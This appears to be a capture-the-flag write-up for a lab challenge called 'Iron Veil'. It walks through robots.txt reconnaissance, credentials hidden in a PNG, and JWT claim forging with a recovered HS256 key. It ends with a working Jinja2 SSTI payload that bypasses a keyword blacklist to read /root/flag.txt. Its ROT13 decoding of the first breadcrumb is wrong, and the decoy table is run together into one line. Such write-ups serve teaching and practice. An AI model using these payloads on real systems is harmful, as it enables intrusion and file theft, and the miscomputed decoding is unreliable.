# Iron Veil 

## 1. Reconnaissance
The public-facing site is a contractor homepage with residual migration artifacts. The first useful discovery is `/robots.txt`:
```
SYNT{1_e0o0gf_xa0j_g00_zhpu}
```


Applying ROT13 yields the breadcrumb:
```
FLAG{1_r0b0gf_klm_w00_tmch}
```



This confirms the challenge expects inspection of legacy assets. Useful paths to check:

- `/robots.txt`
- `/archive/`
- `/legacy/`
- `/internal/`
- `/api/v2/`
- `/debug`

## 2. Exposed Archive
The `/archive/` page contains migration-era assets. Key files:

- `/archive/media/casefile_delta.png` — real artifact (image data followed by appended textual payload)
- `/archive/media/decoy_alpha.png` and `/archive/media/decoy_bravo.png` — decoys for comparison
- Supporting files: `incident_log.txt`, `access_dump.csv`

Extracted credentials from the payload in `casefile_delta.png`:

- **Username:** `operator_kessler`
- **Password:** `0p3r@t0r_Kx9f2`

Multiple decoy flag-like strings appear throughout the archive and should be disregarded.

## 3. Authentication Migration
Public legacy login routes are ineffective. Valid credentials work against the relocated internal service:
```
POST /internal/auth/login
Content-Type: application/x-www-form-urlencoded
username=operator_kessler&password=0p3r%40t0r_Kx9f2
```


The response sets an `ivs_token` cookie containing a JWT. The authenticated dashboard identifies the account as a sysadmin, but the token’s claims lack sufficient privileges for vault access.

Dashboard details:

- Auth Type: JWT/HS256
- Token cookie: `ivs_token`
- Vault requirement: `sysadmin` role with clearance level 5

The admin page is a dead end and displays the explicit decoy:
```
DECOY{admin_is_not_the_way}
```


Administrative privileges are controlled via JWT claims.

## 4. JWT Claim Manipulation
The token is signed with HS256. Migration/profile material exposes enough information to recover the signing secret.

Decode the legitimate token, preserve identity and timing claims, then elevate authorization claims:

```json
{
  "role": "sysadmin",
  "clearance": 5
}
```

Re-sign the modified token with the recovered HS256 key and present it as the ivs_token cookie. Signature verification is enforced, so an unsigned-token attack will fail.
With the elevated token, the dashboard confirms:

Role: sysadmin
Clearance: Level 5

The vault becomes reachable but returns another intermediate decoy:
```
FLAG{6_trust_n0_t0ken}
```

>This is not the final flag (required format is lun4r{...}).

## 5. SSTI in the Template Preview

The authenticated /internal/preview endpoint renders user-controlled content using Jinja2 and explicitly states support for Jinja2 syntax.
A simple test confirms evaluation:
``
text{{ 7 * 7 }}
``
A blacklist blocks direct references to __globals__, __builtins__, open, and flag. These must be constructed dynamically via concatenation and accessed through the cycler object.
Working payload:
```
text{{ cycler|attr('_' ~ '_init_' ~ '_')
   |attr('_' ~ '_globals_' ~ '_')
   |attr('_' ~ '_getitem_' ~ '_')('_' ~ '_builtins_' ~ '_')
   |attr('_' ~ '_getitem_' ~ '_')('open')
   ('/root/' ~ 'f' ~ 'lag' ~ '.txt')
   |attr('r' ~ 'ead')() }}
```
### Submit via:
```
textPOST /internal/preview
Cookie: ivs_token=<forged-valid-jwt>
Content-Type: application/x-www-form-urlencoded
template=<payload>
```
### This payload:

```
Obtains __init__ from cycler
Retrieves its __globals__ dictionary
Accesses __builtins__ without literal blocked strings
Retrieves open
Dynamically constructs /root/flag.txt
Reads and returns the file contents
```
## 6. Decoys Encountered

>ValueReasonDECOY{admin_is_not_the_way}Explicitly labeled as a decoy on the admin pageFLAG{6_trust_n0_t0ken}Vault checkpoint; not in required lun4r{...} formatlun4r{3_d4ta_h1des_1n_pl41n_s1ght}Archive/data breadcrumb decoylun4r{4_1d0r_br34ks_b0undar1es}API/IDOR-themed breadcrumb decoy
>The final flag is obtained solely via the authenticated SSTI file read.
## 7. Final Flag
```text
lun4r{v31l_sh4tt3r3d_n0_m0r3_secr3ts_7f9a2e}
```
